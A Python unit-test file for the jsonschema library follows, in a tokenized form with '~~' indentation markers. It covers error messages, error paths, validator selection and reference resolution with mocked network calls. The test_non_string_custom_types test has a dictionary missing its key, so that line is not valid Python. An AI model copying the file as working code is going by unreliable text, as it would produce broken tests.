\n 
~~ def test_iter_errors ( self ) : \n 
~~~ instance = [ 1 , 2 ] \n 
schema = { \n 
u"disallow" : u"array" , \n 
u"enum" : [ [ "a" , "b" , "c" ] , [ "d" , "e" , "f" ] ] , \n 
u"minItems" : 3 \n 
} \n 
\n 
got = ( e . message for e in self . validator . iter_errors ( instance , schema ) ) \n 
expected = [ \n 
"%r is disallowed for [1, 2]" % ( schema [ "disallow" ] , ) , \n 
"[1, 2] is too short" , \n 
"[1, 2] is not one of %r" % ( schema [ "enum" ] , ) , \n 
] \n 
self . assertEqual ( sorted ( got ) , sorted ( expected ) ) \n 
\n 
~~ def test_iter_errors_multiple_failures_one_validator ( self ) : \n 
~~~ instance = { "foo" : 2 , "bar" : [ 1 ] , "baz" : 15 , "quux" : "spam" } \n 
schema = { \n 
u"properties" : { \n 
"foo" : { u"type" : "string" } , \n 
"bar" : { u"minItems" : 2 } , \n 
"baz" : { u"maximum" : 10 , u"enum" : [ 2 , 4 , 6 , 8 ] } , \n 
} \n 
} \n 
\n 
errors = list ( self . validator . iter_errors ( instance , schema ) ) \n 
self . assertEqual ( len ( errors ) , 4 ) \n 
\n 
\n 
~~ ~~ class TestValidationErrorMessages ( unittest . TestCase ) : \n 
~~~ def message_for ( self , instance , schema , * args , ** kwargs ) : \n 
~~~ kwargs . setdefault ( "cls" , Draft3Validator ) \n 
with self . assertRaises ( ValidationError ) as e : \n 
~~~ validate ( instance , schema , * args , ** kwargs ) \n 
~~ return e . exception . message \n 
\n 
~~ def test_single_type_failure ( self ) : \n 
~~~ message = self . message_for ( instance = 1 , schema = { u"type" : u"string" } ) \n 
self . assertEqual ( message , "1 is not of type %r" % u"string" ) \n 
\n 
~~ def test_single_type_list_failure ( self ) : \n 
~~~ message = self . message_for ( instance = 1 , schema = { u"type" : [ u"string" ] } ) \n 
self . assertEqual ( message , "1 is not of type %r" % u"string" ) \n 
\n 
~~ def test_multiple_type_failure ( self ) : \n 
~~~ types = u"string" , u"object" \n 
message = self . message_for ( instance = 1 , schema = { u"type" : list ( types ) } ) \n 
self . assertEqual ( message , "1 is not of type %r, %r" % types ) \n 
\n 
~~ def test_object_without_title_type_failure ( self ) : \n 
~~~ type = { u"type" : [ { u"minimum" : 3 } ] } \n 
message = self . message_for ( instance = 1 , schema = { u"type" : [ type ] } ) \n 
self . assertEqual ( message , "1 is not of type %r" % ( type , ) ) \n 
\n 
~~ def test_object_with_name_type_failure ( self ) : \n 
~~~ name = "Foo" \n 
schema = { u"type" : [ { u"name" : name , u"minimum" : 3 } ] } \n 
message = self . message_for ( instance = 1 , schema = schema ) \n 
self . assertEqual ( message , "1 is not of type %r" % ( name , ) ) \n 
\n 
~~ def test_minimum ( self ) : \n 
~~~ message = self . message_for ( instance = 1 , schema = { "minimum" : 2 } ) \n 
self . assertEqual ( message , "1 is less than the minimum of 2" ) \n 
\n 
~~ def test_maximum ( self ) : \n 
~~~ message = self . message_for ( instance = 1 , schema = { "maximum" : 0 } ) \n 
self . assertEqual ( message , "1 is greater than the maximum of 0" ) \n 
\n 
~~ def test_dependencies_failure_has_single_element_not_list ( self ) : \n 
~~~ depend , on = "bar" , "foo" \n 
schema = { u"dependencies" : { depend : on } } \n 
message = self . message_for ( { "bar" : 2 } , schema ) \n 
self . assertEqual ( message , "%r is a dependency of %r" % ( on , depend ) ) \n 
\n 
~~ def test_additionalItems_single_failure ( self ) : \n 
~~~ message = self . message_for ( \n 
[ 2 ] , { u"items" : [ ] , u"additionalItems" : False } , \n 
) \n 
self . assertIn ( "(2 was unexpected)" , message ) \n 
\n 
~~ def test_additionalItems_multiple_failures ( self ) : \n 
~~~ message = self . message_for ( \n 
[ 1 , 2 , 3 ] , { u"items" : [ ] , u"additionalItems" : False } \n 
) \n 
self . assertIn ( "(1, 2, 3 were unexpected)" , message ) \n 
\n 
~~ def test_additionalProperties_single_failure ( self ) : \n 
~~~ additional = "foo" \n 
schema = { u"additionalProperties" : False } \n 
message = self . message_for ( { additional : 2 } , schema ) \n 
self . assertIn ( "(%r was unexpected)" % ( additional , ) , message ) \n 
\n 
~~ def test_additionalProperties_multiple_failures ( self ) : \n 
~~~ schema = { u"additionalProperties" : False } \n 
message = self . message_for ( dict . fromkeys ( [ "foo" , "bar" ] ) , schema ) \n 
\n 
self . assertIn ( repr ( "foo" ) , message ) \n 
self . assertIn ( repr ( "bar" ) , message ) \n 
self . assertIn ( "were unexpected)" , message ) \n 
\n 
~~ def test_invalid_format_default_message ( self ) : \n 
~~~ checker = FormatChecker ( formats = ( ) ) \n 
check_fn = mock . Mock ( return_value = False ) \n 
checker . checks ( u"thing" ) ( check_fn ) \n 
\n 
schema = { u"format" : u"thing" } \n 
message = self . message_for ( "bla" , schema , format_checker = checker ) \n 
\n 
self . assertIn ( repr ( "bla" ) , message ) \n 
self . assertIn ( repr ( "thing" ) , message ) \n 
self . assertIn ( "is not a" , message ) \n 
\n 
\n 
~~ ~~ class TestValidationErrorDetails ( unittest . TestCase ) : \n 
# TODO: These really need unit tests for each individual validator, rather \n 
#       than just these higher level tests. \n 
~~~ def test_anyOf ( self ) : \n 
~~~ instance = 5 \n 
schema = { \n 
"anyOf" : [ \n 
{ "minimum" : 20 } , \n 
{ "type" : "string" } \n 
] \n 
} \n 
\n 
validator = Draft4Validator ( schema ) \n 
errors = list ( validator . iter_errors ( instance ) ) \n 
self . assertEqual ( len ( errors ) , 1 ) \n 
e = errors [ 0 ] \n 
\n 
self . assertEqual ( e . validator , "anyOf" ) \n 
self . assertEqual ( e . validator_value , schema [ "anyOf" ] ) \n 
self . assertEqual ( e . instance , instance ) \n 
self . assertEqual ( e . schema , schema ) \n 
self . assertIsNone ( e . parent ) \n 
\n 
self . assertEqual ( e . path , deque ( [ ] ) ) \n 
self . assertEqual ( e . relative_path , deque ( [ ] ) ) \n 
self . assertEqual ( e . absolute_path , deque ( [ ] ) ) \n 
\n 
self . assertEqual ( e . schema_path , deque ( [ "anyOf" ] ) ) \n 
self . assertEqual ( e . relative_schema_path , deque ( [ "anyOf" ] ) ) \n 
self . assertEqual ( e . absolute_schema_path , deque ( [ "anyOf" ] ) ) \n 
\n 
self . assertEqual ( len ( e . context ) , 2 ) \n 
\n 
e1 , e2 = sorted_errors ( e . context ) \n 
\n 
self . assertEqual ( e1 . validator , "minimum" ) \n 
self . assertEqual ( e1 . validator_value , schema [ "anyOf" ] [ 0 ] [ "minimum" ] ) \n 
self . assertEqual ( e1 . instance , instance ) \n 
self . assertEqual ( e1 . schema , schema [ "anyOf" ] [ 0 ] ) \n 
self . assertIs ( e1 . parent , e ) \n 
\n 
self . assertEqual ( e1 . path , deque ( [ ] ) ) \n 
self . assertEqual ( e1 . absolute_path , deque ( [ ] ) ) \n 
self . assertEqual ( e1 . relative_path , deque ( [ ] ) ) \n 
\n 
self . assertEqual ( e1 . schema_path , deque ( [ 0 , "minimum" ] ) ) \n 
self . assertEqual ( e1 . relative_schema_path , deque ( [ 0 , "minimum" ] ) ) \n 
self . assertEqual ( \n 
e1 . absolute_schema_path , deque ( [ "anyOf" , 0 , "minimum" ] ) , \n 
) \n 
\n 
self . assertFalse ( e1 . context ) \n 
\n 
self . assertEqual ( e2 . validator , "type" ) \n 
self . assertEqual ( e2 . validator_value , schema [ "anyOf" ] [ 1 ] [ "type" ] ) \n 
self . assertEqual ( e2 . instance , instance ) \n 
self . assertEqual ( e2 . schema , schema [ "anyOf" ] [ 1 ] ) \n 
self . assertIs ( e2 . parent , e ) \n 
\n 
self . assertEqual ( e2 . path , deque ( [ ] ) ) \n 
self . assertEqual ( e2 . relative_path , deque ( [ ] ) ) \n 
self . assertEqual ( e2 . absolute_path , deque ( [ ] ) ) \n 
\n 
self . assertEqual ( e2 . schema_path , deque ( [ 1 , "type" ] ) ) \n 
self . assertEqual ( e2 . relative_schema_path , deque ( [ 1 , "type" ] ) ) \n 
self . assertEqual ( e2 . absolute_schema_path , deque ( [ "anyOf" , 1 , "type" ] ) ) \n 
\n 
self . assertEqual ( len ( e2 . context ) , 0 ) \n 
\n 
~~ def test_type ( self ) : \n 
~~~ instance = { "foo" : 1 } \n 
schema = { \n 
"type" : [ \n 
{ "type" : "integer" } , \n 
{ \n 
"type" : "object" , \n 
"properties" : { \n 
"foo" : { "enum" : [ 2 ] } \n 
} \n 
} \n 
] \n 
} \n 
\n 
validator = Draft3Validator ( schema ) \n 
errors = list ( validator . iter_errors ( instance ) ) \n 
self . assertEqual ( len ( errors ) , 1 ) \n 
e = errors [ 0 ] \n 
\n 
self . assertEqual ( e . validator , "type" ) \n 
self . assertEqual ( e . validator_value , schema [ "type" ] ) \n 
self . assertEqual ( e . instance , instance ) \n 
self . assertEqual ( e . schema , schema ) \n 
self . assertIsNone ( e . parent ) \n 
\n 
self . assertEqual ( e . path , deque ( [ ] ) ) \n 
self . assertEqual ( e . relative_path , deque ( [ ] ) ) \n 
self . assertEqual ( e . absolute_path , deque ( [ ] ) ) \n 
\n 
self . assertEqual ( e . schema_path , deque ( [ "type" ] ) ) \n 
self . assertEqual ( e . relative_schema_path , deque ( [ "type" ] ) ) \n 
self . assertEqual ( e . absolute_schema_path , deque ( [ "type" ] ) ) \n 
\n 
self . assertEqual ( len ( e . context ) , 2 ) \n 
\n 
e1 , e2 = sorted_errors ( e . context ) \n 
\n 
self . assertEqual ( e1 . validator , "type" ) \n 
self . assertEqual ( e1 . validator_value , schema [ "type" ] [ 0 ] [ "type" ] ) \n 
self . assertEqual ( e1 . instance , instance ) \n 
self . assertEqual ( e1 . schema , schema [ "type" ] [ 0 ] ) \n 
self . assertIs ( e1 . parent , e ) \n 
\n 
self . assertEqual ( e1 . path , deque ( [ ] ) ) \n 
self . assertEqual ( e1 . relative_path , deque ( [ ] ) ) \n 
self . assertEqual ( e1 . absolute_path , deque ( [ ] ) ) \n 
\n 
self . assertEqual ( e1 . schema_path , deque ( [ 0 , "type" ] ) ) \n 
self . assertEqual ( e1 . relative_schema_path , deque ( [ 0 , "type" ] ) ) \n 
self . assertEqual ( e1 . absolute_schema_path , deque ( [ "type" , 0 , "type" ] ) ) \n 
\n 
self . assertFalse ( e1 . context ) \n 
\n 
self . assertEqual ( e2 . validator , "enum" ) \n 
self . assertEqual ( e2 . validator_value , [ 2 ] ) \n 
self . assertEqual ( e2 . instance , 1 ) \n 
self . assertEqual ( e2 . schema , { u"enum" : [ 2 ] } ) \n 
self . assertIs ( e2 . parent , e ) \n 
\n 
self . assertEqual ( e2 . path , deque ( [ "foo" ] ) ) \n 
self . assertEqual ( e2 . relative_path , deque ( [ "foo" ] ) ) \n 
self . assertEqual ( e2 . absolute_path , deque ( [ "foo" ] ) ) \n 
\n 
self . assertEqual ( \n 
e2 . schema_path , deque ( [ 1 , "properties" , "foo" , "enum" ] ) , \n 
) \n 
self . assertEqual ( \n 
e2 . relative_schema_path , deque ( [ 1 , "properties" , "foo" , "enum" ] ) , \n 
) \n 
self . assertEqual ( \n 
e2 . absolute_schema_path , \n 
deque ( [ "type" , 1 , "properties" , "foo" , "enum" ] ) , \n 
) \n 
\n 
self . assertFalse ( e2 . context ) \n 
\n 
~~ def test_single_nesting ( self ) : \n 
~~~ instance = { "foo" : 2 , "bar" : [ 1 ] , "baz" : 15 , "quux" : "spam" } \n 
schema = { \n 
"properties" : { \n 
"foo" : { "type" : "string" } , \n 
"bar" : { "minItems" : 2 } , \n 
"baz" : { "maximum" : 10 , "enum" : [ 2 , 4 , 6 , 8 ] } , \n 
} \n 
} \n 
\n 
validator = Draft3Validator ( schema ) \n 
errors = validator . iter_errors ( instance ) \n 
e1 , e2 , e3 , e4 = sorted_errors ( errors ) \n 
\n 
self . assertEqual ( e1 . path , deque ( [ "bar" ] ) ) \n 
self . assertEqual ( e2 . path , deque ( [ "baz" ] ) ) \n 
self . assertEqual ( e3 . path , deque ( [ "baz" ] ) ) \n 
self . assertEqual ( e4 . path , deque ( [ "foo" ] ) ) \n 
\n 
self . assertEqual ( e1 . relative_path , deque ( [ "bar" ] ) ) \n 
self . assertEqual ( e2 . relative_path , deque ( [ "baz" ] ) ) \n 
self . assertEqual ( e3 . relative_path , deque ( [ "baz" ] ) ) \n 
self . assertEqual ( e4 . relative_path , deque ( [ "foo" ] ) ) \n 
\n 
self . assertEqual ( e1 . absolute_path , deque ( [ "bar" ] ) ) \n 
self . assertEqual ( e2 . absolute_path , deque ( [ "baz" ] ) ) \n 
self . assertEqual ( e3 . absolute_path , deque ( [ "baz" ] ) ) \n 
self . assertEqual ( e4 . absolute_path , deque ( [ "foo" ] ) ) \n 
\n 
self . assertEqual ( e1 . validator , "minItems" ) \n 
self . assertEqual ( e2 . validator , "enum" ) \n 
self . assertEqual ( e3 . validator , "maximum" ) \n 
self . assertEqual ( e4 . validator , "type" ) \n 
\n 
~~ def test_multiple_nesting ( self ) : \n 
~~~ instance = [ 1 , { "foo" : 2 , "bar" : { "baz" : [ 1 ] } } , "quux" ] \n 
schema = { \n 
"type" : "string" , \n 
"items" : { \n 
"type" : [ "string" , "object" ] , \n 
"properties" : { \n 
"foo" : { "enum" : [ 1 , 3 ] } , \n 
"bar" : { \n 
"type" : "array" , \n 
"properties" : { \n 
"bar" : { "required" : True } , \n 
"baz" : { "minItems" : 2 } , \n 
} \n 
} \n 
} \n 
} \n 
} \n 
\n 
validator = Draft3Validator ( schema ) \n 
errors = validator . iter_errors ( instance ) \n 
e1 , e2 , e3 , e4 , e5 , e6 = sorted_errors ( errors ) \n 
\n 
self . assertEqual ( e1 . path , deque ( [ ] ) ) \n 
self . assertEqual ( e2 . path , deque ( [ 0 ] ) ) \n 
self . assertEqual ( e3 . path , deque ( [ 1 , "bar" ] ) ) \n 
self . assertEqual ( e4 . path , deque ( [ 1 , "bar" , "bar" ] ) ) \n 
self . assertEqual ( e5 . path , deque ( [ 1 , "bar" , "baz" ] ) ) \n 
self . assertEqual ( e6 . path , deque ( [ 1 , "foo" ] ) ) \n 
\n 
self . assertEqual ( e1 . schema_path , deque ( [ "type" ] ) ) \n 
self . assertEqual ( e2 . schema_path , deque ( [ "items" , "type" ] ) ) \n 
self . assertEqual ( \n 
list ( e3 . schema_path ) , [ "items" , "properties" , "bar" , "type" ] , \n 
) \n 
self . assertEqual ( \n 
list ( e4 . schema_path ) , \n 
[ "items" , "properties" , "bar" , "properties" , "bar" , "required" ] , \n 
) \n 
self . assertEqual ( \n 
list ( e5 . schema_path ) , \n 
[ "items" , "properties" , "bar" , "properties" , "baz" , "minItems" ] \n 
) \n 
self . assertEqual ( \n 
list ( e6 . schema_path ) , [ "items" , "properties" , "foo" , "enum" ] , \n 
) \n 
\n 
self . assertEqual ( e1 . validator , "type" ) \n 
self . assertEqual ( e2 . validator , "type" ) \n 
self . assertEqual ( e3 . validator , "type" ) \n 
self . assertEqual ( e4 . validator , "required" ) \n 
self . assertEqual ( e5 . validator , "minItems" ) \n 
self . assertEqual ( e6 . validator , "enum" ) \n 
\n 
~~ def test_recursive ( self ) : \n 
~~~ schema = { \n 
"definitions" : { \n 
"node" : { \n 
"anyOf" : [ { \n 
"type" : "object" , \n 
"required" : [ "name" , "children" ] , \n 
"properties" : { \n 
"name" : { \n 
"type" : "string" , \n 
} , \n 
"children" : { \n 
"type" : "object" , \n 
"patternProperties" : { \n 
"^.*$" : { \n 
"$ref" : "#/definitions/node" , \n 
} , \n 
} , \n 
} , \n 
} , \n 
} ] , \n 
} , \n 
} , \n 
"type" : "object" , \n 
"required" : [ "root" ] , \n 
"properties" : { \n 
"root" : { "$ref" : "#/definitions/node" } , \n 
} \n 
} \n 
\n 
instance = { \n 
"root" : { \n 
"name" : "root" , \n 
"children" : { \n 
"a" : { \n 
"name" : "a" , \n 
"children" : { \n 
"ab" : { \n 
"name" : "ab" , \n 
# missing "children" \n 
} \n 
} \n 
} , \n 
} , \n 
} , \n 
} \n 
validator = Draft4Validator ( schema ) \n 
\n 
e , = validator . iter_errors ( instance ) \n 
self . assertEqual ( e . absolute_path , deque ( [ "root" ] ) ) \n 
self . assertEqual ( \n 
e . absolute_schema_path , deque ( [ "properties" , "root" , "anyOf" ] ) , \n 
) \n 
\n 
e1 , = e . context \n 
self . assertEqual ( e1 . absolute_path , deque ( [ "root" , "children" , "a" ] ) ) \n 
self . assertEqual ( \n 
e1 . absolute_schema_path , deque ( \n 
[ \n 
"properties" , \n 
"root" , \n 
"anyOf" , \n 
0 , \n 
"properties" , \n 
"children" , \n 
"patternProperties" , \n 
"^.*$" , \n 
"anyOf" , \n 
] , \n 
) , \n 
) \n 
\n 
e2 , = e1 . context \n 
self . assertEqual ( \n 
e2 . absolute_path , deque ( \n 
[ "root" , "children" , "a" , "children" , "ab" ] , \n 
) , \n 
) \n 
self . assertEqual ( \n 
e2 . absolute_schema_path , deque ( \n 
[ \n 
"properties" , \n 
"root" , \n 
"anyOf" , \n 
0 , \n 
"properties" , \n 
"children" , \n 
"patternProperties" , \n 
"^.*$" , \n 
"anyOf" , \n 
0 , \n 
"properties" , \n 
"children" , \n 
"patternProperties" , \n 
"^.*$" , \n 
"anyOf" \n 
] , \n 
) , \n 
) \n 
\n 
~~ def test_additionalProperties ( self ) : \n 
~~~ instance = { "bar" : "bar" , "foo" : 2 } \n 
schema = { \n 
"additionalProperties" : { "type" : "integer" , "minimum" : 5 } \n 
} \n 
\n 
validator = Draft3Validator ( schema ) \n 
errors = validator . iter_errors ( instance ) \n 
e1 , e2 = sorted_errors ( errors ) \n 
\n 
self . assertEqual ( e1 . path , deque ( [ "bar" ] ) ) \n 
self . assertEqual ( e2 . path , deque ( [ "foo" ] ) ) \n 
\n 
self . assertEqual ( e1 . validator , "type" ) \n 
self . assertEqual ( e2 . validator , "minimum" ) \n 
\n 
~~ def test_patternProperties ( self ) : \n 
~~~ instance = { "bar" : 1 , "foo" : 2 } \n 
schema = { \n 
"patternProperties" : { \n 
"bar" : { "type" : "string" } , \n 
"foo" : { "minimum" : 5 } \n 
} \n 
} \n 
\n 
validator = Draft3Validator ( schema ) \n 
errors = validator . iter_errors ( instance ) \n 
e1 , e2 = sorted_errors ( errors ) \n 
\n 
self . assertEqual ( e1 . path , deque ( [ "bar" ] ) ) \n 
self . assertEqual ( e2 . path , deque ( [ "foo" ] ) ) \n 
\n 
self . assertEqual ( e1 . validator , "type" ) \n 
self . assertEqual ( e2 . validator , "minimum" ) \n 
\n 
~~ def test_additionalItems ( self ) : \n 
~~~ instance = [ "foo" , 1 ] \n 
schema = { \n 
"items" : [ ] , \n 
"additionalItems" : { "type" : "integer" , "minimum" : 5 } \n 
} \n 
\n 
validator = Draft3Validator ( schema ) \n 
errors = validator . iter_errors ( instance ) \n 
e1 , e2 = sorted_errors ( errors ) \n 
\n 
self . assertEqual ( e1 . path , deque ( [ 0 ] ) ) \n 
self . assertEqual ( e2 . path , deque ( [ 1 ] ) ) \n 
\n 
self . assertEqual ( e1 . validator , "type" ) \n 
self . assertEqual ( e2 . validator , "minimum" ) \n 
\n 
~~ def test_additionalItems_with_items ( self ) : \n 
~~~ instance = [ "foo" , "bar" , 1 ] \n 
schema = { \n 
"items" : [ { } ] , \n 
"additionalItems" : { "type" : "integer" , "minimum" : 5 } \n 
} \n 
\n 
validator = Draft3Validator ( schema ) \n 
errors = validator . iter_errors ( instance ) \n 
e1 , e2 = sorted_errors ( errors ) \n 
\n 
self . assertEqual ( e1 . path , deque ( [ 1 ] ) ) \n 
self . assertEqual ( e2 . path , deque ( [ 2 ] ) ) \n 
\n 
self . assertEqual ( e1 . validator , "type" ) \n 
self . assertEqual ( e2 . validator , "minimum" ) \n 
\n 
\n 
~~ ~~ class ValidatorTestMixin ( object ) : \n 
~~~ def setUp ( self ) : \n 
~~~ self . instance = mock . Mock ( ) \n 
self . schema = { } \n 
self . resolver = mock . Mock ( ) \n 
self . validator = self . validator_class ( self . schema ) \n 
\n 
~~ def test_valid_instances_are_valid ( self ) : \n 
~~~ errors = iter ( [ ] ) \n 
\n 
with mock . patch . object ( \n 
self . validator , "iter_errors" , return_value = errors , \n 
) : \n 
~~~ self . assertTrue ( \n 
self . validator . is_valid ( self . instance , self . schema ) \n 
) \n 
\n 
~~ ~~ def test_invalid_instances_are_not_valid ( self ) : \n 
~~~ errors = iter ( [ mock . Mock ( ) ] ) \n 
\n 
with mock . patch . object ( \n 
self . validator , "iter_errors" , return_value = errors , \n 
) : \n 
~~~ self . assertFalse ( \n 
self . validator . is_valid ( self . instance , self . schema ) \n 
) \n 
\n 
~~ ~~ def test_non_existent_properties_are_ignored ( self ) : \n 
~~~ instance , my_property , my_value = mock . Mock ( ) , mock . Mock ( ) , mock . Mock ( ) \n 
validate ( instance = instance , schema = { my_property : my_value } ) \n 
\n 
~~ def test_it_creates_a_ref_resolver_if_not_provided ( self ) : \n 
~~~ self . assertIsInstance ( self . validator . resolver , RefResolver ) \n 
\n 
~~ def test_it_delegates_to_a_ref_resolver ( self ) : \n 
~~~ resolver = RefResolver ( "" , { } ) \n 
schema = { "$ref" : mock . Mock ( ) } \n 
\n 
with mock . patch . object ( resolver , "resolve" ) as resolve : \n 
~~~ resolve . return_value = "url" , { "type" : "integer" } \n 
with self . assertRaises ( ValidationError ) : \n 
~~~ self . validator_class ( schema , resolver = resolver ) . validate ( None ) \n 
\n 
~~ ~~ resolve . assert_called_once_with ( schema [ "$ref" ] ) \n 
\n 
~~ def test_it_delegates_to_a_legacy_ref_resolver ( self ) : \n 
~~~ """\n        Legacy RefResolvers support only the context manager form of\n        resolution.\n\n        """ \n 
\n 
class LegacyRefResolver ( object ) : \n 
~~~ @ contextmanager \n 
def resolving ( this , ref ) : \n 
~~~ self . assertEqual ( ref , "the ref" ) \n 
yield { "type" : "integer" } \n 
\n 
~~ ~~ resolver = LegacyRefResolver ( ) \n 
schema = { "$ref" : "the ref" } \n 
\n 
with self . assertRaises ( ValidationError ) : \n 
~~~ self . validator_class ( schema , resolver = resolver ) . validate ( None ) \n 
\n 
~~ ~~ def test_is_type_is_true_for_valid_type ( self ) : \n 
~~~ self . assertTrue ( self . validator . is_type ( "foo" , "string" ) ) \n 
\n 
~~ def test_is_type_is_false_for_invalid_type ( self ) : \n 
~~~ self . assertFalse ( self . validator . is_type ( "foo" , "array" ) ) \n 
\n 
~~ def test_is_type_evades_bool_inheriting_from_int ( self ) : \n 
~~~ self . assertFalse ( self . validator . is_type ( True , "integer" ) ) \n 
self . assertFalse ( self . validator . is_type ( True , "number" ) ) \n 
\n 
~~ def test_is_type_raises_exception_for_unknown_type ( self ) : \n 
~~~ with self . assertRaises ( UnknownType ) : \n 
~~~ self . validator . is_type ( "foo" , object ( ) ) \n 
\n 
\n 
~~ ~~ ~~ class TestDraft3Validator ( ValidatorTestMixin , unittest . TestCase ) : \n 
~~~ validator_class = Draft3Validator \n 
\n 
def test_is_type_is_true_for_any_type ( self ) : \n 
~~~ self . assertTrue ( self . validator . is_valid ( mock . Mock ( ) , { "type" : "any" } ) ) \n 
\n 
~~ def test_is_type_does_not_evade_bool_if_it_is_being_tested ( self ) : \n 
~~~ self . assertTrue ( self . validator . is_type ( True , "boolean" ) ) \n 
self . assertTrue ( self . validator . is_valid ( True , { "type" : "any" } ) ) \n 
\n 
~~ def test_non_string_custom_types ( self ) : \n 
~~~ schema = { : [ None ] } \n 
cls = self . validator_class ( schema , types = { None : type ( None ) } ) \n 
cls . validate ( None , schema ) \n 
\n 
\n 
~~ ~~ class TestDraft4Validator ( ValidatorTestMixin , unittest . TestCase ) : \n 
~~~ validator_class = Draft4Validator \n 
\n 
\n 
~~ class TestBuiltinFormats ( unittest . TestCase ) : \n 
~~~ """\n    The built-in (specification-defined) formats do not raise type errors.\n\n    If an instance or value is not a string, it should be ignored.\n\n    """ \n 
\n 
\n 
~~ for format in FormatChecker . checkers : \n 
~~~ def test ( self , format = format ) : \n 
~~~ v = Draft4Validator ( { "format" : format } , format_checker = FormatChecker ( ) ) \n 
v . validate ( 123 ) \n 
\n 
~~ name = "test_{0}_ignores_non_strings" . format ( format ) \n 
test . __name__ = name \n 
setattr ( TestBuiltinFormats , name , test ) \n 
del test # Ugh py.test. Stop discovering top level tests. \n 
\n 
\n 
~~ class TestValidatorFor ( unittest . TestCase ) : \n 
~~~ def test_draft_3 ( self ) : \n 
~~~ schema = { "$schema" : "http://json-schema.org/draft-03/schema" } \n 
self . assertIs ( validator_for ( schema ) , Draft3Validator ) \n 
\n 
schema = { "$schema" : "http://json-schema.org/draft-03/schema#" } \n 
self . assertIs ( validator_for ( schema ) , Draft3Validator ) \n 
\n 
~~ def test_draft_4 ( self ) : \n 
~~~ schema = { "$schema" : "http://json-schema.org/draft-04/schema" } \n 
self . assertIs ( validator_for ( schema ) , Draft4Validator ) \n 
\n 
schema = { "$schema" : "http://json-schema.org/draft-04/schema#" } \n 
self . assertIs ( validator_for ( schema ) , Draft4Validator ) \n 
\n 
~~ def test_custom_validator ( self ) : \n 
~~~ Validator = create ( meta_schema = { "id" : "meta schema id" } , version = "12" ) \n 
schema = { "$schema" : "meta schema id" } \n 
self . assertIs ( validator_for ( schema ) , Validator ) \n 
\n 
~~ def test_validator_for_jsonschema_default ( self ) : \n 
~~~ self . assertIs ( validator_for ( { } ) , Draft4Validator ) \n 
\n 
~~ def test_validator_for_custom_default ( self ) : \n 
~~~ self . assertIs ( validator_for ( { } , default = None ) , None ) \n 
\n 
\n 
~~ ~~ class TestValidate ( unittest . TestCase ) : \n 
~~~ def test_draft3_validator_is_chosen ( self ) : \n 
~~~ schema = { "$schema" : "http://json-schema.org/draft-03/schema#" } \n 
with mock . patch . object ( Draft3Validator , "check_schema" ) as chk_schema : \n 
~~~ validate ( { } , schema ) \n 
chk_schema . assert_called_once_with ( schema ) \n 
# Make sure it works without the empty fragment \n 
~~ schema = { "$schema" : "http://json-schema.org/draft-03/schema" } \n 
with mock . patch . object ( Draft3Validator , "check_schema" ) as chk_schema : \n 
~~~ validate ( { } , schema ) \n 
chk_schema . assert_called_once_with ( schema ) \n 
\n 
~~ ~~ def test_draft4_validator_is_chosen ( self ) : \n 
~~~ schema = { "$schema" : "http://json-schema.org/draft-04/schema#" } \n 
with mock . patch . object ( Draft4Validator , "check_schema" ) as chk_schema : \n 
~~~ validate ( { } , schema ) \n 
chk_schema . assert_called_once_with ( schema ) \n 
\n 
~~ ~~ def test_draft4_validator_is_the_default ( self ) : \n 
~~~ with mock . patch . object ( Draft4Validator , "check_schema" ) as chk_schema : \n 
~~~ validate ( { } , { } ) \n 
chk_schema . assert_called_once_with ( { } ) \n 
\n 
\n 
~~ ~~ ~~ class TestRefResolver ( unittest . TestCase ) : \n 
\n 
~~~ base_uri = "" \n 
stored_uri = "foo://stored" \n 
stored_schema = { "stored" : "schema" } \n 
\n 
def setUp ( self ) : \n 
~~~ self . referrer = { } \n 
self . store = { self . stored_uri : self . stored_schema } \n 
self . resolver = RefResolver ( self . base_uri , self . referrer , self . store ) \n 
\n 
~~ def test_it_does_not_retrieve_schema_urls_from_the_network ( self ) : \n 
~~~ ref = Draft3Validator . META_SCHEMA [ "id" ] \n 
with mock . patch . object ( self . resolver , "resolve_remote" ) as remote : \n 
~~~ with self . resolver . resolving ( ref ) as resolved : \n 
~~~ self . assertEqual ( resolved , Draft3Validator . META_SCHEMA ) \n 
~~ ~~ self . assertFalse ( remote . called ) \n 
\n 
~~ def test_it_resolves_local_refs ( self ) : \n 
~~~ ref = "#/properties/foo" \n 
self . referrer [ "properties" ] = { "foo" : object ( ) } \n 
with self . resolver . resolving ( ref ) as resolved : \n 
~~~ self . assertEqual ( resolved , self . referrer [ "properties" ] [ "foo" ] ) \n 
\n 
~~ ~~ def test_it_resolves_local_refs_with_id ( self ) : \n 
~~~ schema = { "id" : "http://bar/schema#" , "a" : { "foo" : "bar" } } \n 
resolver = RefResolver . from_schema ( schema ) \n 
with resolver . resolving ( "#/a" ) as resolved : \n 
~~~ self . assertEqual ( resolved , schema [ "a" ] ) \n 
~~ with resolver . resolving ( "http://bar/schema#/a" ) as resolved : \n 
~~~ self . assertEqual ( resolved , schema [ "a" ] ) \n 
\n 
~~ ~~ def test_it_retrieves_stored_refs ( self ) : \n 
~~~ with self . resolver . resolving ( self . stored_uri ) as resolved : \n 
~~~ self . assertIs ( resolved , self . stored_schema ) \n 
\n 
~~ self . resolver . store [ "cached_ref" ] = { "foo" : 12 } \n 
with self . resolver . resolving ( "cached_ref#/foo" ) as resolved : \n 
~~~ self . assertEqual ( resolved , 12 ) \n 
\n 
~~ ~~ def test_it_retrieves_unstored_refs_via_requests ( self ) : \n 
~~~ ref = "http://bar#baz" \n 
schema = { "baz" : 12 } \n 
\n 
with mock . patch ( "jsonschema.validators.requests" ) as requests : \n 
~~~ requests . get . return_value . json . return_value = schema \n 
with self . resolver . resolving ( ref ) as resolved : \n 
~~~ self . assertEqual ( resolved , 12 ) \n 
~~ ~~ requests . get . assert_called_once_with ( "http://bar" ) \n 
\n 
~~ def test_it_retrieves_unstored_refs_via_urlopen ( self ) : \n 
~~~ ref = "http://bar#baz" \n 
schema = { "baz" : 12 } \n 
\n 
with mock . patch ( "jsonschema.validators.requests" , None ) : \n 
~~~ with mock . patch ( "jsonschema.validators.urlopen" ) as urlopen : \n 
~~~ urlopen . return_value . read . return_value = ( \n 
json . dumps ( schema ) . encode ( "utf8" ) ) \n 
with self . resolver . resolving ( ref ) as resolved : \n 
~~~ self . assertEqual ( resolved , 12 ) \n 
~~ ~~ ~~ urlopen . assert_called_once_with ( "http://bar" ) \n 
\n 
~~ def test_it_can_construct_a_base_uri_from_a_schema ( self ) : \n 
~~~ schema = { "id" : "foo" } \n 
resolver = RefResolver . from_schema ( schema ) \n 
self . assertEqual ( resolver . base_uri , "foo" ) \n 
self . assertEqual ( resolver . resolution_scope , "foo" ) \n 
